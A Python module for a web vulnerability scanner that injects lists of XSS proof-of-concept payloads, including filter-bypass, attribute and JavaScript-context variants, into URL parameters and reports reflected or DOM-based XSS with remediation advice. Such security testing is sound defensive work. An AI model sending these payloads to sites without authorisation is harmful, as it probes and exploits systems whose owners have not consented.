"""
XSS (Cross-Site Scripting) Scanner
"""
import re
from typing import List, Optional
from .base import BaseScanner, Vulnerability, Severity
from ..http.client import Response


class XSSScanner(BaseScanner):
    """XSS vulnerability scanner"""
    
    # Reflected XSS payloads
    REFLECTED_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        "<style onload=alert('XSS')>",
        "<link rel=stylesheet onload=alert('XSS')>",
        "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
        "<base href=javascript:alert('XSS')//>",
        "<form><button formaction=javascript:alert('XSS')>CLICK",
        "<object data=javascript:alert('XSS')>",
        "<embed src=javascript:alert('XSS')>",
    ]
    
    # DOM-based XSS payloads
    DOM_PAYLOADS = [
        "#<script>alert('XSS')</script>",
        "#javascript:alert('XSS')",
        "#<img src=x onerror=alert('XSS')>",
        "#<svg onload=alert('XSS')>",
        "?test=<script>alert('XSS')</script>",
        "?test=javascript:alert('XSS')",
    ]
    
    # Encoded payloads for bypassing filters
    ENCODED_PAYLOADS = [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert('XSS')</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ]
    
    # HTML context payloads
    HTML_CONTEXT_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
    ]
    
    # Attribute context payloads
    ATTRIBUTE_PAYLOADS = [
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "\" onmouseover=alert('XSS')>",
        "' onmouseover=alert('XSS')>",
        "\" onerror=alert('XSS')>",
        "' onerror=alert('XSS')>",
    ]
    
    # JavaScript context payloads
    JS_CONTEXT_PAYLOADS = [
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';alert('XSS');",
        "\";alert('XSS');",
        "');alert('XSS');//",
        "\");alert('XSS');//",
        "javascript:alert('XSS')",
    ]
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        
        test_params = params or {}
        if not test_params:
            # Extract from URL
            if "?" in url:
                query_string = url.split("?")[1]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        # Test reflected XSS
        for param_name, param_value in test_params.items():
            # Test all payload categories
            vuln = await self._test_reflected_xss(url, param_name, param_value, method)
            if vuln:
                vulnerabilities.append(vuln)
            
            vuln = await self._test_dom_xss(url, param_name, param_value, method)
            if vuln:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_reflected_xss(
        self, url: str, param: str, value: str, method: str
    ) -> Optional[Vulnerability]:
        """Test for reflected XSS"""
        all_payloads = (
            self.REFLECTED_PAYLOADS +
            self.ENCODED_PAYLOADS +
            self.HTML_CONTEXT_PAYLOADS +
            self.ATTRIBUTE_PAYLOADS +
            self.JS_CONTEXT_PAYLOADS
        )
        
        for payload in all_payloads[:15]:  # Limit for performance
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params)
                else:
                    resp = await self.http_client.post(url, data=test_params)
                
                # Check if payload is reflected
                if self._is_payload_reflected(resp, payload):
                    # Check if it's executable
                    if self._is_payload_executable(resp.text, payload):
                        return self._create_vulnerability(
                            name="Cross-Site Scripting (Reflected)",
                            severity=Severity.HIGH,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="Reflected XSS vulnerability detected",
                            evidence="Payload is reflected and executable in response",
                            recommendation="Implement proper input validation and output encoding. Use Content Security Policy (CSP).",
                            cwe="CWE-79"
                        )
                    else:
                        # Payload reflected but might be encoded
                        return self._create_vulnerability(
                            name="Cross-Site Scripting (Reflected - Potential)",
                            severity=Severity.MEDIUM,
                            url=url,
                            parameter=param,
                            payload=payload,
                            description="XSS payload reflected but may be encoded",
                            evidence="Payload found in response but execution unclear",
                            recommendation="Implement proper input validation and output encoding. Use Content Security Policy (CSP).",
                            cwe="CWE-79"
                        )
            except:
                continue
        
        return None
    
    async def _test_dom_xss(self, url: str, param: str, value: str, method: str) -> Optional[Vulnerability]:
        """Test for DOM-based XSS"""
        for payload in self.DOM_PAYLOADS:
            try:
                # DOM XSS often in URL fragments or parameters
                test_url = f"{url}{payload}"
                resp = await self.http_client.get(test_url)
                
                # Check if payload appears in JavaScript context
                if self._check_dom_context(resp.text, payload):
                    return self._create_vulnerability(
                        name="Cross-Site Scripting (DOM-based)",
                        severity=Severity.HIGH,
                        url=test_url,
                        parameter=param,
                        payload=payload,
                        description="DOM-based XSS vulnerability detected",
                        evidence="Payload appears in DOM/JavaScript context",
                        recommendation="Avoid using user input in DOM manipulation. Use safe DOM APIs and validate/sanitize input.",
                        cwe="CWE-79"
                    )
            except:
                continue
        
        return None
    
    def _is_payload_reflected(self, response: Response, payload: str) -> bool:
        """Check if payload is reflected in response - more strict"""
        # Check exact match in non-encoded context
        if payload in response.text:
            # Make sure it's not in a comment or attribute value that's escaped
            payload_pos = response.text.find(payload)
            if payload_pos > 0:
                # Check context around payload
                context_before = response.text[max(0, payload_pos-50):payload_pos]
                context_after = response.text[payload_pos+len(payload):payload_pos+len(payload)+50]
                
                # If in HTML comment, likely false positive
                if "<!--" in context_before and "-->" in context_after:
                    return False
                
                # If in script tag with proper escaping, likely false positive
                if "<script" in context_before.lower():
                    # Check if it's properly escaped
                    if "\\" in context_before or "\\" in context_after:
                        return False
                
                return True
        
        return False
    
    def _is_payload_executable(self, html: str, payload: str) -> bool:
        """Check if payload appears in executable context - more strict"""
        html_lower = html.lower()
        payload_lower = payload.lower()
        
        # Check if script tags are present and executable
        if "<script" in payload_lower:
            # Find all script tags
            script_pattern = r'<script[^>]*>(.*?)</script>'
            scripts = re.finditer(script_pattern, html_lower, re.IGNORECASE | re.DOTALL)
            
            for script_match in scripts:
                script_content = script_match.group(1)
                # Check if payload content appears in script (not just as string)
                if "alert" in payload_lower and "alert" in script_content:
                    # Verify it's not in a string literal
                    # Simple check: if it's followed by ( it's likely executable
                    alert_pos = script_content.find("alert")
                    if alert_pos > 0:
                        after_alert = script_content[alert_pos:alert_pos+10]
                        if "(" in after_alert:
                            return True
        
        # Check for event handlers - more strict
        event_handlers = ["onerror", "onload", "onclick", "onmouseover", "onfocus"]
        for handler in event_handlers:
            if handler in payload_lower:
                # Find handler in HTML
                handler_pattern = rf'{handler}\s*=\s*["\']([^"\']*)["\']'
                matches = re.finditer(handler_pattern, html_lower, re.IGNORECASE)
                for match in matches:
                    handler_value = match.group(1)
                    # Check if payload content is in handler value
                    if any(part in handler_value for part in payload_lower.split() if len(part) > 3):
                        return True
        
        # Check for javascript: protocol - more strict
        if "javascript:" in payload_lower:
            js_pattern = r'javascript:\s*([^"\'<>]*)'
            matches = re.finditer(js_pattern, html_lower, re.IGNORECASE)
            for match in matches:
                js_content = match.group(1)
                if "alert" in js_content or "eval" in js_content:
                    return True
        
        return False
    
    def _check_dom_context(self, html: str, payload: str) -> bool:
        """Check if payload appears in DOM/JavaScript context"""
        # Look for JavaScript code
        script_patterns = [
            r'<script[^>]*>(.*?)</script>',
            r'javascript:.*',
            r'on\w+\s*=\s*["\'].*',
            r'eval\s*\(',
            r'document\.(write|writeln)\s*\(',
            r'innerHTML\s*=',
            r'outerHTML\s*=',
        ]
        
        for pattern in script_patterns:
            matches = re.finditer(pattern, html, re.IGNORECASE | re.DOTALL)
            for match in matches:
                if payload in match.group(0) or any(part in match.group(0) for part in payload.split()):
                    return True
        
        return False

